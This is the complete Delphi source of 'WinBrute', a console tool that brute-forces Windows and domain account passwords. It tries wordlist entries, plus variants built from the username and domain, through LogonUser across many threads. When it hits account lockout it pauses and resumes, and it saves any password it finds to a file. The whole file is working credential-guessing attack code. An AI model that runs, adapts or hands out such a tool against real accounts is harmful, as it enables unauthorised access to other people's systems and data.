{
  Copyright 2012 Stas'M Corp.

  Licensed under the Apache License, Version 2.0 (the "License");
  you may not use this file except in compliance with the License.
  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
}

program WinBrute;

{$APPTYPE CONSOLE}

uses
  SysUtils,
  Windows,
  SyncObjs,
  Classes;

type
  Thr = class(TThread)
    ShortPause: Boolean;
    slp: Cardinal;
    procedure Execute; override;
  end;

var
  Threads: Array of Thr;
  hToken: THandle;
  S: TStringList;
  cnt, cntp: Cardinal;
  ShortPause: Boolean = False;
  user, domain, goodpass: String;
  uCode: LongWord = 0;
  C: TCriticalSection;
  stop, gotit: Boolean;
  OutF: TextFile;

procedure WriteOut(S: String);
begin
  if ParamStr(4) = '' then
    Exit;
  Writeln(OutF, S);
end;

procedure Thr.Execute;
var
  pass: String;
  b: Boolean;
  ErrCode: LongWord;
  Idx, I: Integer;
begin
  inherited;
  Idx := -1;
  while not Terminated do begin
    C.Enter;
    if ShortPause then begin
      C.Leave;
      ShortPause := False;
      Sleep(slp);
      slp := 0;
      C.Enter;
    end;
    if Integer(cnt) >= S.Count - 1 then begin
      C.Leave;
      stop := True;
      Terminate;
      Break;
    end else begin
      Idx := InterlockedIncrement(Integer(cnt));
      pass := S.Strings[Idx];
      C.Leave;
    end;
    b := False;
    try
      if Domain <> '' then
        b := LogonUser(PWideChar(user), PWideChar(domain), PWideChar(pass), LOGON32_LOGON_NETWORK,
        LOGON32_PROVIDER_DEFAULT, hToken)
      else
        b := LogonUser(PWideChar(user), nil, PWideChar(pass), LOGON32_LOGON_NETWORK,
        LOGON32_PROVIDER_DEFAULT, hToken);
    except

    end;
    if b then begin
      CloseHandle(hToken);
      goodpass := pass;
      stop := True;
      gotit := True;
      Break;
    end else begin
      ErrCode := GetLastError;
      case ErrCode of
        ERROR_NOT_SUPPORTED: begin // The request is not supported (Windows failure)
          C.Enter;
          Writeln('[-] ERROR_NOT_SUPPORTED encountered, seems to be general LSASS failure');
          Writeln('[-] Obviously you need to restart your computer');
          Halt(1);
          C.Leave;
        end;
        ERROR_SHUTDOWN_IN_PROGRESS: begin // Shutdown in progress
          C.Enter;
          Writeln('[-] Windows is shutting down');
          Halt(1);
          C.Leave;
        end;
        ERROR_LOGON_FAILURE: ; // The user name or password is incorrect
        ERROR_INVALID_LOGON_HOURS: // Account has time restrictions that keep it from signing in right now
        begin
          C.Enter;
          Writeln('[-] Selected user isn''t allowed to sign in right now');
          Halt(1);
          C.Leave;
        end;
        ERROR_INVALID_WORKSTATION: begin // This user isn't allowed to sign in to this computer
          C.Enter;
          Writeln('[-] Selected user isn''t allowed to sign in to this computer');
          Halt(1);
          C.Leave;
        end;
        ERROR_ACCOUNT_RESTRICTION, // Blank password or sign-in time limitation
        ERROR_PASSWORD_EXPIRED, // Password expired
        ERROR_ACCOUNT_DISABLED, // Account disabled
        ERROR_ACCOUNT_EXPIRED, // Account expired
        ERROR_PASSWORD_MUST_CHANGE: // User must change password
        begin
          goodpass := pass;
          stop := True;
          gotit := True;
          uCode := ErrCode;
          Break;
        end;
        ERROR_NO_LOGON_SERVERS: begin // Logon server is down
          C.Enter;
          InterlockedExchange(Integer(cnt), Idx);
          Writeln('[-] Logon server not responding');
          for I := 0 to Length(Threads) - 1 do begin
            Threads[I].ShortPause := True;
            Threads[I].slp := 5000;
          end;
          C.Leave;
        end;
        ERROR_ACCOUNT_LOCKED_OUT: begin // Anti-bruteforce lock
          C.Enter;
          InterlockedExchange(Integer(cnt), Idx);
          Writeln('[-] Account bruteforce rate limiting detected');
          for I := 0 to Length(Threads) - 1 do begin
            Threads[I].ShortPause := True;
            Threads[I].slp := 5000;
          end;
          C.Leave;
        end;
        else begin
          C.Enter;
          Writeln('[?] Unknown error ', ErrCode);
          if Domain <> '' then
            Writeln('[?] Username: ', ParamStr(3)+'\'+ParamStr(2))
          else
            Writeln('[?] Username: ', ParamStr(2));
          Writeln('[?] Password: ', pass);
          C.Leave;
        end;
      end;
    end;
  end;
end;

function TranslitRu(S: String): String;
var
  I: Integer;
begin
  for I:=1 to Length(S) do
    case S[I] of
      'Q': S[I] := 'Й';
      'W': S[I] := 'Ц';
      'E': S[I] := 'У';
      'R': S[I] := 'К';
      'T': S[I] := 'Е';
      'Y': S[I] := 'Н';
      'U': S[I] := 'Г';
      'I': S[I] := 'Ш';
      'O': S[I] := 'Щ';
      'P': S[I] := 'З';
      '{': S[I] := 'Х';
      '}': S[I] := 'Ъ';
      'A': S[I] := 'Ф';
      'S': S[I] := 'Ы';
      'D': S[I] := 'В';
      'F': S[I] := 'А';
      'G': S[I] := 'П';
      'H': S[I] := 'Р';
      'J': S[I] := 'О';
      'K': S[I] := 'Л';
      'L': S[I] := 'Д';
      ':': S[I] := 'Ж';
      '"': S[I] := 'Э';
      'Z': S[I] := 'Я';
      'X': S[I] := 'Ч';
      'C': S[I] := 'С';
      'V': S[I] := 'М';
      'B': S[I] := 'И';
      'N': S[I] := 'Т';
      'M': S[I] := 'Ь';
      '<': S[I] := 'Б';
      '>': S[I] := 'Ю';
      '?': S[I] := ',';

      'q': S[I] := 'й';
      'w': S[I] := 'ц';
      'e': S[I] := 'у';
      'r': S[I] := 'к';
      't': S[I] := 'е';
      'y': S[I] := 'н';
      'u': S[I] := 'г';
      'i': S[I] := 'ш';
      'o': S[I] := 'щ';
      'p': S[I] := 'з';
      '[': S[I] := 'х';
      ']': S[I] := 'ъ';
      'a': S[I] := 'ф';
      's': S[I] := 'ы';
      'd': S[I] := 'в';
      'f': S[I] := 'а';
      'g': S[I] := 'п';
      'h': S[I] := 'р';
      'j': S[I] := 'о';
      'k': S[I] := 'л';
      'l': S[I] := 'д';
      ';': S[I] := 'ж';
      '''': S[I] := 'э';
      'z': S[I] := 'я';
      'x': S[I] := 'ч';
      'c': S[I] := 'с';
      'v': S[I] := 'м';
      'b': S[I] := 'и';
      'n': S[I] := 'т';
      'm': S[I] := 'ь';
      ',': S[I] := 'б';
      '.': S[I] := 'ю';
      '/': S[I] := '.';

      '|': S[I] := '\';
      '~': S[I] := 'Ё';
      '`': S[I] := 'ё';
      '#': S[I] := '№';
      //
      'Й': S[I] := 'Q';
      'Ц': S[I] := 'W';
      'У': S[I] := 'E';
      'К': S[I] := 'R';
      'Е': S[I] := 'T';
      'Н': S[I] := 'Y';
      'Г': S[I] := 'U';
      'Ш': S[I] := 'I';
      'Щ': S[I] := 'O';
      'З': S[I] := 'P';
      'Х': S[I] := '{';
      'Ъ': S[I] := '}';
      'Ф': S[I] := 'A';
      'Ы': S[I] := 'S';
      'В': S[I] := 'D';
      'А': S[I] := 'F';
      'П': S[I] := 'G';
      'Р': S[I] := 'H';
      'О': S[I] := 'J';
      'Л': S[I] := 'K';
      'Д': S[I] := 'L';
      'Ж': S[I] := ':';
      'Э': S[I] := '"';
      'Я': S[I] := 'Z';
      'Ч': S[I] := 'X';
      'С': S[I] := 'C';
      'М': S[I] := 'V';
      'И': S[I] := 'B';
      'Т': S[I] := 'N';
      'Ь': S[I] := 'M';
      'Б': S[I] := '<';
      'Ю': S[I] := '>';

      'й': S[I] := 'q';
      'ц': S[I] := 'w';
      'у': S[I] := 'e';
      'к': S[I] := 'r';
      'е': S[I] := 't';
      'н': S[I] := 'y';
      'г': S[I] := 'u';
      'ш': S[I] := 'i';
      'щ': S[I] := 'o';
      'з': S[I] := 'p';
      'х': S[I] := '[';
      'ъ': S[I] := ']';
      'ф': S[I] := 'a';
      'ы': S[I] := 's';
      'в': S[I] := 'd';
      'а': S[I] := 'f';
      'п': S[I] := 'g';
      'р': S[I] := 'h';
      'о': S[I] := 'j';
      'л': S[I] := 'k';
      'д': S[I] := 'l';
      'ж': S[I] := ';';
      'э': S[I] := '''';
      'я': S[I] := 'z';
      'ч': S[I] := 'x';
      'с': S[I] := 'c';
      'м': S[I] := 'v';
      'и': S[I] := 'b';
      'т': S[I] := 'n';
      'ь': S[I] := 'm';
      'б': S[I] := ',';
      'ю': S[I] := '.';

      '\': S[I] := '|';
      'Ё': S[I] := '~';
      'ё': S[I] := '`';
      '№': S[I] := '#';
    end;
  Result := S;
end;

var
  I: Integer;
  SI: TSystemInfo;
  cc, lcnt, pcnt: Cardinal;
  ust, unm: String;

begin
  try
    { TODO -oUser -cConsole Main : Insert code here }
    Writeln('Windows Password Brute by Stas''M');
    Writeln('Copyright (C) Stas''M Corp. 2012');
    Writeln('');
    if ParamCount < 2 then begin
      Writeln('USAGE: WinBrute.exe <wordlist> <user> [domain] [outfile]');
      Exit;
    end;
    S := TStringList.Create;
    user := ParamStr(2);
    domain := ParamStr(3);
    if ParamStr(4) <> '' then
    begin
      Assign(OutF, ParamStr(4));
      if not FileExists(ParamStr(4)) then
        Rewrite(OutF)
      else
        Append(OutF);
    end;
    S.LoadFromFile(ParamStr(1));
    S.Text := StringReplace(S.Text, '%username%', user, [rfReplaceAll]);
    S.Insert(0, '');
    S.Insert(0, user);
    S.Insert(0, user+user);
    S.Insert(0, user+user+user);
    S.Insert(0, TranslitRu(user));
    S.Insert(0, TranslitRu(user+user));
    S.Insert(0, TranslitRu(user+user+user));
    if LowerCase(user) <> user then begin
      S.Insert(0, LowerCase(user));
      S.Insert(0, LowerCase(user+user));
      S.Insert(0, LowerCase(user+user+user));
      S.Insert(0, TranslitRu(LowerCase(user)));
      S.Insert(0, TranslitRu(LowerCase(user+user)));
      S.Insert(0, TranslitRu(LowerCase(user+user+user)));
    end;
    if UpperCase(user) <> user then begin
      S.Insert(0, UpperCase(user));
      S.Insert(0, UpperCase(user+user));
      S.Insert(0, UpperCase(user+user+user));
      S.Insert(0, TranslitRu(UpperCase(user)));
      S.Insert(0, TranslitRu(UpperCase(user+user)));
      S.Insert(0, TranslitRu(UpperCase(user+user+user)));
    end;
    if domain <> '' then begin
      S.Insert(0, domain);
      S.Insert(0, domain+domain);
      S.Insert(0, domain+domain+domain);
      S.Insert(0, TranslitRu(domain));
      S.Insert(0, TranslitRu(domain+domain));
      S.Insert(0, TranslitRu(domain+domain+domain));
      if LowerCase(domain) <> domain then begin
        S.Insert(0, LowerCase(domain));
        S.Insert(0, LowerCase(domain+domain));
        S.Insert(0, LowerCase(domain+domain+domain));
        S.Insert(0, TranslitRu(LowerCase(domain)));
        S.Insert(0, TranslitRu(LowerCase(domain+domain)));
        S.Insert(0, TranslitRu(LowerCase(domain+domain+domain)));
      end;
      if UpperCase(domain) <> domain then begin
        S.Insert(0, UpperCase(domain));
        S.Insert(0, UpperCase(domain+domain));
        S.Insert(0, UpperCase(domain+domain+domain));
        S.Insert(0, TranslitRu(UpperCase(domain)));
        S.Insert(0, TranslitRu(UpperCase(domain+domain)));
        S.Insert(0, TranslitRu(UpperCase(domain+domain+domain)));
      end;
    end;
    if Length(user) > 3 then
    begin
      S.Insert(0, user[1] + user[Length(user)-1] + user[Length(user)]);
      S.Insert(0, LowerCase(user[1] + user[Length(user)-1] + user[Length(user)]));
      S.Insert(0, UpperCase(user[1] + user[Length(user)-1] + user[Length(user)]));
    end;
    pcnt := S.Count;
    GetNativeSystemInfo(SI);
    SetLength(Threads, SI.dwNumberOfProcessors);
    goodpass := '';
    stop := False;
    gotit := False;
    cnt := 0;
    cntp := 0;
    C := TCriticalSection.Create;
    for I := 0 to Length(Threads) - 1 do begin
      Threads[I] := Thr.Create(True);
      Threads[I].FreeOnTerminate := True;
      Threads[I].ShortPause := False;
      Threads[I].slp := 0;
    end;
    for I := 0 to Length(Threads) - 1 do
      Threads[I].Start;
    while not stop do begin
      Sleep(1000);
      C.Enter;
      lcnt := cnt;
      C.Leave;
      cc := lcnt - cntp;
      cntp := lcnt;
      Writeln('[*] Rate: ', cc, ' p/s (', Round(lcnt*(100/pcnt)), '%)');
    end;
    C.Free;
    S.Free;
    if gotit then begin
      ust := '';
      unm := '';
      case uCode of
        ERROR_ACCOUNT_RESTRICTION: begin
          Writeln('[*] Warning: Logon is restricted by policy');
          ust := 'restricted';
        end;
        ERROR_PASSWORD_EXPIRED,
        ERROR_ACCOUNT_EXPIRED: begin
          Writeln('[*] Warning: User account has expired');
          ust := 'expired';
        end;
        ERROR_ACCOUNT_DISABLED: begin
          Writeln('[*] Warning: User account is disabled');
          ust := 'disabled';
        end;
        ERROR_PASSWORD_MUST_CHANGE: begin
          Writeln('[*] Warning: User must change password');
          ust := 'change';
        end;
      end;
      if Domain <> '' then
        unm := ParamStr(3) + '\' + ParamStr(2)
      else
        unm := ParamStr(2);
      Writeln('[+] Username: ', unm);
      if goodpass = '' then
      begin
        WriteOut(unm + #9 + '<empty>' + #9 + ust);
        Writeln('[+] Empty password');
      end
      else begin
        WriteOut(unm + #9 + goodpass + #9 + ust);
        Writeln('[+] Password: ', goodpass);
      end;
    end else
      Writeln('[-] Password not found');
    if ParamStr(4) <> '' then
      CloseFile(OutF);
  except
    on E: Exception do
      Writeln(E.ClassName, ': ', E.Message);
  end;
end.
